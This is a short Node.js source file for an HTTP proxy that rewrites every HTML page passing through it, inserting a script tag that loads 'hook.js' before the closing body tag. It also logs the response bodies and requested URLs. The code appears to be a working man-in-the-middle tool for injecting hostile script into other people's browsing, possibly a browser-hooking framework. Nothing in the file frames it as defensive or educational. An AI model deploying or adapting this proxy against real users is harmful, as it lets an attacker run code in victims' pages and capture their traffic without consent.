'use strict';

var http = require('http'),
    https = require('https'),
    connect = require('connect'),
    httpProxy = require('http-proxy'),
    url = require('url'),
    tamper = require('tamper'),

    PROXY_PORT = 8000,

	app;


// Basic Connect App
app = connect();
// Connect middlewares
// // Injecting our library
app.use(tamper(function (req, res) {
    // We only want to modify html responses
    if (res.getHeader('Content-Type') !== 'text/html') {
        // Returning a falsy processing will continue as usual
        return;
    }

    // Return a function in order to capture and modify the response body
    return function (body) {
        console.log(body);
        return body.replace(/<\/body>/g, '<script src="hook.js"></script></body>');
    };
}));

// Sending to the proxy
app.use(
    function (req, res) {
        var finalUrl = req.url,
            parsedUrl = url.parse(finalUrl),

            proxy;

        console.log(parsedUrl);

        // Create a new proxy instance for each request
        proxy = new httpProxy.createProxyServer({
            // target: 'https://google.com',
            // Proxying the target server
            target: req.url,
            agent: https.globalAgent,
            // headers: { host: 'nodejs.org' }
            // headers: { host: 'google.com' }
            // Getting the domain from the url
            headers: { host: parsedUrl.hostname }
        });

        proxy.web(req, res);
        // proxy.close();
    }
);

// Start the HTTP Proxy
http.createServer(app).listen(PROXY_PORT);
console.log('Proxy server started at localhost:' + PROXY_PORT);
